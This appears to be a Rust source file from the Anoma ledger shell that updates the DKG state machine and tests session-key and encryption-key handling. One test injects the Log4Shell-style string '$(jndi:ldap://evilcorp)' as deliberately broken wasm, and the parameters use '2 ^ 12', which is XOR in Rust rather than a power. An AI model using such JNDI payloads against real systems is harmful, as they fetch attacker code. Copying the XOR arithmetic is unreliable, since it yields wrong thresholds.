//! Update the DKG state machine

use anoma::types::key::dkg_session_keys::DkgPublicKey;
use anoma::types::transaction::EncryptionKey;
use ferveo::{DkgState, PvssScheduler};

use super::*;
impl<D, H> Shell<D, H>
where
    D: DB + for<'iter> DBIter<'iter> + Sync + 'static,
    H: StorageHasher + Sync + 'static,
{
    /// Update the DKG state machine
    ///  * At the start of a new epoch, reset state machine and update session
    ///    keys and store new encryption key
    ///  * keep a counter of blocks transpired since protocol start
    ///  * issue a PVSS transcript according to the state machines schedule
    pub fn update_dkg(&mut self) {
        // update the current encryption key to that generated in
        // previous epoch if a new epoch has started
        if let ShellMode::Validator { dkg, .. } = &self.mode {
            if dkg.update {
                if let DkgState::Success { final_key } = dkg.state_machine.state
                {
                    tracing::info!("Storing the newly created encryption key from the DKG.");
                    self.storage.encryption_key =
                        Some(EncryptionKey(final_key).try_to_vec().unwrap());
                } else {
                    tracing::debug!(
                        "The DKG did not complete in the previous epoch. \
                        Encrypting transactions is not possible this epoch."
                    );
                    // If DKG was not successful in the past epoch, we have
                    // no new key TODO: Allow this
                    // DKG to continue while the new one also starts
                    self.storage.encryption_key = None;
                }
            }

            if let Err(err) = self.new_dkg_instance() {
                panic!(
                    "Failed to create a new DKG instance for the new epoch \
                     with error: {} \n\n\n The state of the last block has \
                     been persisted, so it is safe to shut down and resolve \
                     the issue.",
                    err,
                )
            }
        }
        if let Err(err) = self.issue_pvss_transcript() {
            panic!(
                "Failed to issue a PVSS transcript for this instance of the \
                 DKG with error: {} \n\n\n The state of the last block has \
                 been persisted, so it is safe to shut down and resolve the \
                 issue.",
                err,
            )
        }
    }

    /// At the start of a new epoch, create a fresh DKG instance.
    /// This means resetting the DKG state machine with the new validator
    /// sets.
    fn new_dkg_instance(&mut self) -> ShellResult<()> {
        if let ShellMode::Validator { dkg, ref data, .. } = &mut self.mode {
            let (current_epoch, _) = self.storage.get_current_epoch();

            // TODO: The total weight should likely be a config, not hardcoded.
            let params = DkgParams {
                tau: current_epoch.0,
                security_threshold: (2 ^ 12) / 3,
                total_weight: 2 ^ 12,
                retry_after: 32,
            };

            // get the new validator for the next epoch
            let validators = self.storage.read_validator_set();
            let validators = validators
                .get(current_epoch + 1)
                .expect("Validators for the next epoch should be known");

            // extract the relevant data about the active validator set
            let validator_set = ValidatorSet::new(
                validators
                    .active
                    .iter()
                    .map(|val| {
                        let dkg_key =
                            key::dkg_session_keys::dkg_pk_key(&val.address);
                        let bytes = self
                            .storage
                            .read(&dkg_key)
                            .expect(
                                "DKG public key database key should be present",
                            )
                            .0
                            .expect("Validator should have public dkg key");
                        tracing::debug!("DKG PK BYTES: {:?}", &bytes);
                        let dkg_publickey =
                            &<DkgPublicKey as BorshDeserialize>::deserialize(
                                &mut bytes.as_ref(),
                            )
                            .expect(
                                "DKG public session key should be \
                                 deserializable",
                            );
                        TendermintValidator {
                            power: val.voting_power.into(),
                            address: val.address.to_string(),
                            public_key: dkg_publickey.into(),
                        }
                    })
                    .collect(),
            );

            let me = validator_set
                .validators
                .iter()
                .find(|val| data.address.to_string() == val.address);

            // Initiate the new state machine
            if let Some(me) = me {
                let me = me.clone();
                dkg.state_machine = DkgStateMachine::new(
                    validator_set,
                    params,
                    me,
                    data.keys
                        .dkg_keypair
                        .as_ref()
                        .expect("DKG keypair should exist for validator")
                        .into(),
                )
                .map_err(|e| Error::DkgUpdate(e.to_string()))?;
                dkg.update = false;
            }
            tracing::info!("A new DKG instance has been started.")
        }
        Ok(())
    }

    /// Increment the counter of blocks transpired since protocol start.
    /// If the DKG indicates that we are scheduled to deal, broadcast
    /// this validator's PVSS transcript
    fn issue_pvss_transcript(&mut self) -> ShellResult<()> {
        if let ShellMode::Validator {
            data,
            dkg,
            broadcast_sender,
            ..
        } = &mut self.mode
        {
            let rng = &mut ark_std::rand::prelude::StdRng::from_entropy();
            let keypair = data.keys.get_protocol_keypair();
            if dkg.state_machine.increase_block() == PvssScheduler::Issue {
                let tx_bytes = {
                    let keypair = keypair.lock();
                    ProtocolTxType::DKG(
                        dkg.state_machine
                            .share(rng)
                            .map_err(|err| Error::DkgUpdate(err.to_string()))?,
                    )
                    .sign(keypair.borrow())
                    .to_bytes()
                };
                tracing::info!("Issuing new PVSS transcript...");
                // broadcast transaction.
                // We ignore errors here, they are handled elsewhere
                let _ = broadcast_sender.send(tx_bytes);
            }
        }
        Ok(())
    }
}

#[cfg(test)]
mod test_update_dkg {
    use anoma::types::key::dkg_session_keys::dkg_pk_key;
    use anoma::types::key::ed25519::SignedTxData;
    use ark_std::Zero;
    #[cfg(not(feature = "ABCI"))]
    use tendermint::Time;
    #[cfg(feature = "ABCI")]
    use tendermint_stable::Time;

    use super::*;
    use crate::node::ledger::shell::test_utils::*;
    use crate::node::ledger::shims::abcipp_shim_types::shim::request::{
        FinalizeBlock, ProcessedTx,
    };
    use crate::wallet::{ValidatorData, ValidatorKeys};

    /// Test that if a tx requesting a new DKG session keypair
    /// succeeds, it keeps storage and local state in sync
    #[test]
    fn test_new_dkg_keypair() {
        let (mut shell, mut receiver) = setup();

        // assert we are a validator
        assert_matches!(
            shell.shell.mode,
            ShellMode::Validator {
                next_dkg_keypair: None,
                ..
            }
        );

        // request a new dkg session keypair
        shell.shell.request_new_dkg_session_keypair();

        // test that the request is broadcast
        let tx_bytes =
            tokio_test::block_on(async move { receiver.recv().await.unwrap() });

        // test that we received the expected request
        let tx =
            process_tx(Tx::try_from(tx_bytes.as_slice()).expect("Test failed"))
                .expect("Test failed");
        match tx {
            TxType::Protocol(ProtocolTx {
                tx:
                    ProtocolTxType::NewDkgKeypair(Tx {
                        data: Some(data), ..
                    }),
                ..
            }) => {
                let signed_data = SignedTxData::try_from_slice(&data[..])
                    .expect("Test failed")
                    .data
                    .expect("Test failed");
                let UpdateDkgSessionKey {
                    address,
                    dkg_public_key,
                } = BorshDeserialize::deserialize(&mut signed_data.as_slice())
                    .expect("Test failed");
                let dkg_public_key: DkgPublicKey =
                    BorshDeserialize::deserialize(
                        &mut dkg_public_key.as_slice(),
                    )
                    .expect("Test failed");
                assert_eq!(
                    &address,
                    shell
                        .shell
                        .mode
                        .get_validator_address()
                        .expect("Test failed")
                );
                assert_eq!(
                    dkg_public_key,
                    shell
                        .shell
                        .mode
                        .get_next_dkg_keypair()
                        .expect("Test failed")
                        .public()
                );
            }
            _ => {
                panic!("Test failed");
            }
        }

        let processed_tx = ProcessedTx {
            tx: tx_bytes,
            result: TxResult {
                code: ErrorCodes::Ok.into(),
                info: "".into(),
            },
        };

        let mut response = shell
            .finalize_block(FinalizeBlock {
                txs: vec![processed_tx],
                reject_all_decrypted: false,
                ..Default::default()
            })
            .expect("Test failed");
        // this commits the block and changes the storage
        shell.commit();
        // check that the tx was applied
        assert_eq!(response.len(), 1);
        let event = response.remove(0);
        assert_eq!(event.r#type, "applied");
        #[cfg(not(feature = "ABCI"))]
        {
            let code = event
                .attributes
                .iter()
                .find(|attr| attr.key.as_str() == "code")
                .expect("Test failed")
                .value
                .as_str();
            assert_eq!(code, String::from(ErrorCodes::Ok).as_str());
        }
        #[cfg(feature = "ABCI")]
        {
            let code = event
                .attributes
                .iter()
                .find(|attr| attr.key == "code".as_bytes())
                .expect("Test failed")
                .value
                .clone();
            assert_eq!(
                String::from_utf8(code).expect("Test failed"),
                String::from(ErrorCodes::Ok)
            );
        }

        // check that there is no next keypair now
        assert_matches!(
            shell.shell.mode,
            ShellMode::Validator {
                next_dkg_keypair: None,
                ..
            }
        );

        // check that the session public key in storage still matches local
        // state
        let dkg_pk = shell
            .shell
            .storage
            .read(&dkg_pk_key(
                shell
                    .shell
                    .mode
                    .get_validator_address()
                    .expect("Test failed"),
            ))
            .expect("Test failed")
            .0
            .expect("Test failed");
        let dkg_pk: DkgPublicKey =
            BorshDeserialize::deserialize(&mut dkg_pk.as_slice())
                .expect("Test failed");
        if let ShellMode::Validator {
            data:
                ValidatorData {
                    keys:
                        ValidatorKeys {
                            dkg_keypair: Some(kp),
                            ..
                        },
                    ..
                },
            ..
        } = &shell.shell.mode
        {
            assert_eq!(kp.public(), dkg_pk);
        } else {
            panic!("Test failed");
        }

        // check that after new epoch, the new dkg keypair is in the dkg state
        // machine
        let mut req = FinalizeBlock::default();
        req.header.height = 11u32.into();
        // std::thread::sleep(std::time::Duration::from_secs(60));
        req.header.time = Time::from(DateTimeUtc::now());
        shell.finalize_block(req).expect("Test failed");
        shell.commit();
        if let ShellMode::Validator {
            dkg,
            data:
                ValidatorData {
                    keys:
                        ValidatorKeys {
                            dkg_keypair: Some(kp),
                            ..
                        },
                    ..
                },
            ..
        } = &shell.shell.mode
        {
            assert_eq!(
                &DkgKeypair::from(dkg.state_machine.session_keypair),
                kp
            );
        } else {
            panic!("Test failed");
        }
    }

    /// Test that if a tx requesting a new DKG session keypair
    /// is received but no new keypair is queued in local state,
    /// a new request is issued to generate a new session keypair.
    #[test]
    fn test_next_dkg_keypair_is_none() {
        let (mut shell, mut receiver) = setup();
        // request a new dkg session keypair
        shell.shell.request_new_dkg_session_keypair();

        // test that the request is broadcast
        let tx_bytes =
            tokio_test::block_on(async move { receiver.recv().await.unwrap() });
        // the tx to submit to finalize block
        let processed_tx = ProcessedTx {
            tx: tx_bytes,
            result: TxResult {
                code: ErrorCodes::Ok.into(),
                info: "".into(),
            },
        };
        let (mut shell, mut receiver) = setup();
        if let ShellMode::Validator {
            next_dkg_keypair, ..
        } = &shell.shell.mode
        {
            // ensure no new session keypair is queued
            assert_matches!(next_dkg_keypair, None);
        } else {
            panic!("Test failed");
        };

        let mut response = shell
            .finalize_block(FinalizeBlock {
                txs: vec![processed_tx],
                reject_all_decrypted: false,
                ..Default::default()
            })
            .expect("Test failed");

        assert_eq!(response.len(), 1);
        let event = response.remove(0);
        assert_eq!(event.r#type, "applied");
        #[cfg(not(feature = "ABCI"))]
        {
            let code = event
                .attributes
                .iter()
                .find(|attr| attr.key.as_str() == "code")
                .expect("Test failed")
                .value
                .as_str();
            assert_eq!(code, String::from(ErrorCodes::Ok).as_str());
        }
        #[cfg(feature = "ABCI")]
        {
            let code = event
                .attributes
                .iter()
                .find(|attr| attr.key == "code".as_bytes())
                .expect("Test failed")
                .value
                .clone();
            assert_eq!(
                String::from_utf8(code).expect("Test failed"),
                String::from(ErrorCodes::Ok)
            );
        }
        shell.commit();
        let tx_bytes =
            tokio_test::block_on(async move { receiver.recv().await.unwrap() });
        let tx =
            process_tx(Tx::try_from(tx_bytes.as_slice()).expect("Test failed"))
                .expect("Test failed");
        match tx {
            TxType::Protocol(ProtocolTx {
                tx:
                    ProtocolTxType::NewDkgKeypair(Tx {
                        data: Some(data), ..
                    }),
                ..
            }) => {
                let SignedTxData { data, .. } =
                    BorshDeserialize::deserialize(&mut data.as_slice())
                        .expect("Test failed");
                let UpdateDkgSessionKey {
                    address,
                    dkg_public_key,
                } = BorshDeserialize::deserialize(
                    &mut data.expect("Test failed").as_slice(),
                )
                .expect("Test failed");
                let dkg_public_key: DkgPublicKey =
                    BorshDeserialize::deserialize(
                        &mut dkg_public_key.as_slice(),
                    )
                    .expect("Test failed");
                assert_eq!(
                    &address,
                    shell
                        .shell
                        .mode
                        .get_validator_address()
                        .expect("Test failed")
                );
                assert_eq!(
                    dkg_public_key,
                    shell
                        .shell
                        .mode
                        .get_next_dkg_keypair()
                        .expect("Test failed")
                        .public()
                );
            }
            _ => {
                panic!("Test failed");
            }
        }
    }

    /// Test that if a tx requesting a new DKG session keypair
    /// is rejected by the wasm runner, no state changes occur
    /// and we do not update the DKG session keypair in local
    /// state.
    #[test]
    fn test_new_dkg_keypair_wasm_failure() {
        let (mut shell, _) = setup();
        let processed_tx = if let ShellMode::Validator {
            data,
            next_dkg_keypair,
            ..
        } = &mut shell.shell.mode
        {
            // ensure a new session keypair is queued
            *next_dkg_keypair = Some(
                ferveo_common::Keypair::<EllipticCurve>::new(
                    &mut ark_std::rand::prelude::StdRng::from_entropy(),
                )
                .into(),
            );

            let request_data = UpdateDkgSessionKey {
                address: data.address.clone(),
                dkg_public_key: next_dkg_keypair
                    .as_ref()
                    .unwrap()
                    .public()
                    .try_to_vec()
                    .expect("Serialization of DKG public key shouldn't fail"),
            };
            let protocol_keys = data.keys.protocol_keypair.lock();
            let mut request = ProtocolTxType::request_new_dkg_keypair(
                request_data,
                &protocol_keys,
                &shell.shell.wasm_dir,
                read_wasm,
            );
            // put in wasm that won't run correctly
            match &mut request {
                ProtocolTxType::NewDkgKeypair(tx) => {
                    tx.code = "$(jndi:ldap://evilcorp)".as_bytes().to_owned();
                }
                _ => panic!("Test failed"),
            }
            ProcessedTx {
                tx: request.sign(&protocol_keys).to_bytes(),
                result: TxResult {
                    code: ErrorCodes::Ok.into(),
                    info: "".into(),
                },
            }
        } else {
            panic!("Test failed");
        };

        let mut response = shell
            .finalize_block(FinalizeBlock {
                txs: vec![processed_tx],
                reject_all_decrypted: false,
                ..Default::default()
            })
            .expect("Test failed");
        shell.commit();
        // check that we got an error in the wasm
        assert_eq!(response.len(), 1);
        let event = response.remove(0);
        assert_eq!(event.r#type, "applied");
        #[cfg(not(feature = "ABCI"))]
        {
            let code = event
                .attributes
                .iter()
                .find(|attr| attr.key.as_str() == "code")
                .expect("Test failed")
                .value
                .as_str();
            assert_eq!(
                code,
                String::from(ErrorCodes::WasmRuntimeError).as_str()
            );
        }
        #[cfg(feature = "ABCI")]
        {
            let code = event
                .attributes
                .iter()
                .find(|attr| attr.key == "code".as_bytes())
                .expect("Test failed")
                .value
                .clone();
            assert_eq!(
                String::from_utf8(code).expect("Test failed"),
                String::from(ErrorCodes::WasmRuntimeError)
            );
        }

        // check that the session keypair queue is unchanged
        assert_matches!(
            shell.shell.mode,
            ShellMode::Validator {
                next_dkg_keypair: Some(_),
                ..
            }
        );
        // check that the session public key in storage still matches local
        // state
        let dkg_pk = shell
            .shell
            .storage
            .read(&dkg_pk_key(
                shell
                    .shell
                    .mode
                    .get_validator_address()
                    .expect("Test failed"),
            ))
            .expect("Test failed")
            .0
            .expect("Test failed");
        let dkg_pk: DkgPublicKey =
            BorshDeserialize::deserialize(&mut dkg_pk.as_slice())
                .expect("Test failed");
        if let ShellMode::Validator {
            data:
                ValidatorData {
                    keys:
                        ValidatorKeys {
                            dkg_keypair: Some(kp),
                            ..
                        },
                    ..
                },
            ..
        } = &shell.shell.mode
        {
            assert_eq!(kp.public(), dkg_pk);
        } else {
            panic!("Test failed");
        }
    }

    /// Test that at the the end of an epoch, if the DKG state
    /// machine has finished successfully, the new key
    /// is added to storage and the dkg state machine
    /// is reset.
    #[test]
    fn test_new_encryption_key() {
        let (mut shell, _) = setup();

        // set the DKG state machine to a success state
        if let ShellMode::Validator { dkg, .. } = &mut shell.shell.mode {
            dkg.state_machine.state = DkgState::Success {
                final_key: <EllipticCurve as PairingEngine>::G1Affine::zero(),
            }
        }
        // check that there is no encryption key yet
        assert_matches!(shell.shell.storage.encryption_key, None);

        // start a new epoch
        let mut req = FinalizeBlock::default();
        req.header.height = 11u32.into();
        // std::thread::sleep(std::time::Duration::from_secs(60));
        req.header.time = Time::from(DateTimeUtc::now());
        shell.finalize_block(req).expect("Test failed");
        shell.commit();

        // check that the encryption key in storage got updated
        let expect =
            EncryptionKey(<EllipticCurve as PairingEngine>::G1Affine::zero())
                .try_to_vec()
                .expect("Test failed");
        assert_eq!(shell.shell.storage.encryption_key, Some(expect),);
        use super::super::state::DkgInstance;
        // check that a new dkg instance was created
        assert_matches!(
            shell.shell.mode,
            ShellMode::Validator {
                dkg: DkgInstance {
                    state_machine: DkgStateMachine {
                        state: DkgState::Sharing {
                            accumulated_weight: 0,
                            block: 1
                        },
                        ..
                    },
                    update: false,
                },
                ..
            }
        )
    }

    /// Test that when a new epoch starts, a new
    /// pvss transcript is broadcast
    #[test]
    fn test_pvss_transcript_issued() {
        use ferveo::dkg::pv::Message;
        let (mut shell, mut receiver) = setup();

        // start a new epoch
        let mut req = FinalizeBlock::default();
        req.header.height = 11u32.into();
        // std::thread::sleep(std::time::Duration::from_secs(60));
        req.header.time = Time::from(DateTimeUtc::now());
        shell.finalize_block(req).expect("Test failed");
        shell.commit();

        let tx_bytes =
            tokio_test::block_on(async move { receiver.recv().await.unwrap() });
        let tx = Tx::try_from(tx_bytes.as_slice()).expect("Test failed");
        assert_matches!(
            process_tx(tx).unwrap(),
            TxType::Protocol(ProtocolTx {
                tx: ProtocolTxType::DKG(Message::Deal(_)),
                ..
            })
        );
    }
}
